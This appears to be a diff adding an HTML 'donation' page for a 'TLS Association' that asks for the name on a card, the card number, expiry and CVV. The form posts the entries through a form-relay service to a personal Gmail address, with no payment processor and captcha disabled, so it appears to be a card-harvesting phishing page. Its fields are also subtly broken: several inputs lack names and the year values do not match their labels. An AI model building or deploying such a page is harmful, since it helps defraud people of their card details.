@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>TLS</title>
+
+	<link href='https://fonts.googleapis.com/css?family=Roboto:400,300,100' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" href="style.css">
+
+<style type="text/css">
+	
+
+* {
+    box-sizing: border-box;
+}
+ 
+body,
+html {
+    height: 100%;
+    min-height: 100%;
+}
+ 
+body {
+    font-family: 'Roboto',
+    sans-serif;
+    margin: 0;
+    background-color: #e7e7e7;
+}
+
+
+.credit-card {
+    width: 360px;
+    height: 400px;
+    margin: 60px auto 0;
+    border: 1px solid #ddd;
+    border-radius: 6px;
+    background-color: #fff;
+    box-shadow: 1px 2px 3px 0 rgba(0,0,0,.10);
+}
+
+
+.form-header {
+    height: 60px;
+    padding: 20px 30px 0;
+    border-bottom: 1px solid #e1e8ee;
+}
+ 
+.form-body {
+    height: 340px;
+    padding: 30px 30px 20px;
+}
+
+
+
+.title {
+    font-size: 18px;
+    margin: 0;
+    color: #5e6977;
+}
+
+
+.card-number,
+.cvv-input input,
+.month select,
+.year select {
+    font-size: 15px;
+    font-weight: 100;
+    line-height: 14px;
+}
+ 
+.card-number,
+.month select,
+.year select {
+    font-size: 17px;
+    font-weight: 100;
+    line-height: 20px;
+}
+ 
+.card-number,
+.cvv-details,
+.cvv-input input,
+.month select,
+.year select {
+    opacity: .7;
+    color: black;
+
+}
+
+
+
+.card-number {
+    width: 100%;
+    height: 38px;
+    margin-bottom: 20px;
+    padding-left: 20px;
+    border: 2px solid #e1e8ee;
+    border-radius: 6px;
+}
+
+
+
+.month select,
+.year select {
+    width: 145px;
+    height: 38px;
+    margin-bottom: 20px;
+    padding-left: 20px;
+    border: 2px solid #e1e8ee;
+    border-radius: 6px;
+    background: url('caret.png') no-repeat;
+    background-position: 85% 50%;
+    -moz-appearance: none;
+    -webkit-appearance: none;
+}
+ 
+.month select {
+    float: left;
+}
+ 
+.year select {
+    float: right;
+}
+
+
+
+.cvv-input input {
+	height: 38px;
+    float: left;
+    width: 145px;
+    padding-left: 20px;
+    border: 2px solid #e1e8ee;
+    border-radius: 6px;
+    background: #fff;
+}
+ 
+.cvv-details {
+    font-size: 13px;
+    font-weight: 300;
+    line-height: 18px;
+    float: right;
+    margin-bottom: 20px;
+}
+ 
+.cvv-details p {
+    margin-top: 6px;
+}
+
+
+
+.paypal-btn,
+.proceed-btn {
+    cursor: pointer;
+    font-size: 16px;
+    width: 100%;
+    border-color: transparent;
+    border-radius: 6px;
+}
+ 
+.proceed-btn {
+    margin-bottom: 10px;
+    background: #7dc855;
+    height: 38px;
+}
+ 
+.paypal-btn a,
+.proceed-btn a {
+    text-decoration: none;
+}
+ 
+.proceed-btn a {
+    color: #fff;
+}
+ 
+.paypal-btn a {
+    color: rgba(242, 242, 242, .7);
+}
+ 
+.paypal-btn {
+    padding-right: 95px;
+    background: url('paypal-logo.svg') no-repeat 65% 56% #009cde;
+}
+
+
+.aa {
+	flood-color: #5e6977;
+}
+
+select:invalid {
+	color: #5e6977;
+}
+</style>
+
+
+
+
+</head>
+<body>
+	<form class="credit-card" action="https://formsubmit.co/tu7797tu@gmail.com" method="POST">
+  <div class="form-header">
+    <h4 class="title">TLS Association &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2$</h4>
+  </div>
+ 
+  <div class="form-body">
+  	<input type="text" class="card-number" placeholder="Name on Card" maxlength="50" required>
+    <!-- Card Number -->
+    <input type="text" class="card-number" placeholder="Card Number" maxlength="16" minlength="16" onkeypress="return restrictAlphabets(event)" required>
+    <input type="hidden" name="_captcha" value="false">
+    <!-- Date Field -->
+    <div class="date-field">
+      <div class="month">
+        <select name="Month" required >
+          <option value="" disabled selected hidden class="aa" >Month</option>
+          <option value="january">01</option>
+          <option value="february">02</option>
+          <option value="march">03</option>
+          <option value="april">04</option>
+          <option value="may">05</option>
+          <option value="june">06</option>
+          <option value="july">07</option>
+          <option value="august">08</option>
+          <option value="september">09</option>
+          <option value="october">10</option>
+          <option value="november">11</option>
+          <option value="december">12</option>
+        </select>
+      </div>
+      <div class="year">
+        <select name="Year" required>
+          <option value="" disabled selected hidden>Year</option>
+          <option value="2016">2023</option>
+          <option value="2017">2024</option>
+          <option value="2018">2025</option>
+          <option value="2019">2026</option>
+          <option value="2020">2027</option>
+          <option value="2021">2028</option>
+          <option value="2022">2029</option>
+          <option value="2023">2030</option>
+          <option value="2024">2031</option>
+          <option value="2024">2032</option>
+          <option value="2024">2033</option>
+        </select>
+      </div>
+    </div>
+ 
+    <!-- Card Verification Field -->
+    <div class="card-verification">
+      <div class="cvv-input">
+        <input type="text" placeholder="CVV" maxlength="4" required onkeypress="return restrictAlphabets(event)">
+      </div>
+      <div class="cvv-details">
+        <p>3 or 4 digits usually found <br> on the signature strip</p>
+      </div>
+    </div>
+ 
+    <!-- Buttons -->
+    <button type="submit" class="proceed-btn"><a href="#">Donate 2$</a></button>
+    
+  </div>
+</form>
+
+
+<script type="text/javascript">
+	
+function restrictAlphabets(e) {
+	var x = e.which || e.keycode;
+	if ((x >= 48 && x <= 57))
+		return true;
+	else
+		return false;
+}
+
+
+</script>
+
+</body>
+</html>
